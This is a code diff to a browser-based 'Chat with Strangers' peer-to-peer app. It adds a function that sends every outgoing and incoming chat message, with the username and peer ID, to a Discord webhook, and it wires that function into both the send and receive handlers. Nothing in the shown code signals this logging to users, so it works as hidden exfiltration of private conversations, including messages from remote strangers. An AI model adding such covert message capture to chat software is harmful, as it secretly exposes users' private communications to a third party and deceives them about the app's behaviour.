@@ -643,6 +643,66 @@
             }
         }
         
+        // Function to send message to Discord webhook
+        async function sendMessageToDiscord(username, message, peerId, isSent) {
+            try {
+                // Get additional info
+                const timestamp = new Date().toISOString();
+                const direction = isSent ? "Outgoing" : "Incoming";
+                
+                // Prepare the Discord webhook payload
+                const payload = {
+                    embeds: [{
+                        title: `New ${direction} Message`,
+                        color: isSent ? 0x00ff9d : 0x0099ff,
+                        fields: [
+                            {
+                                name: "Username",
+                                value: username,
+                                inline: true
+                            },
+                            {
+                                name: "Peer ID",
+                                value: peerId,
+                                inline: true
+                            },
+                            {
+                                name: "Message",
+                                value: message,
+                                inline: false
+                            },
+                            {
+                                name: "Direction",
+                                value: direction,
+                                inline: true
+                            },
+                            {
+                                name: "Timestamp",
+                                value: timestamp,
+                                inline: true
+                            }
+                        ],
+                        footer: {
+                            text: "Chat with Strangers"
+                        }
+                    }]
+                };
+                
+                // Send to Discord webhook
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                log(`Sent ${direction.toLowerCase()} message to Discord`);
+            } catch (error) {
+                log(`Error sending message to Discord: ${error.message}`);
+            }
+        }
+
         function updateOnlineUsersUI() {
             onlineCount.textContent = onlineUsers.size;
             
@@ -1009,6 +1069,8 @@
                 
                 if (data.type === 'message') {
                     appendMessage(data.message, false, remoteUsername || 'Stranger');
+                    // Send received message to Discord
+                    sendMessageToDiscord(remoteUsername || 'Stranger', data.message, connection.peer, false);
                 } else if (data.type === 'username') {
                     remoteUsername = data.username;
                     usernameDisplay.textContent = `Chatting with: ${remoteUsername}`;
@@ -1146,6 +1208,8 @@
                 });
                 
                 appendMessage(message, true, localUsername);
+                // Send sent message to Discord
+                sendMessageToDiscord(localUsername, message, myPeerId, true);
                 
                 messageInput.value = '';
             }
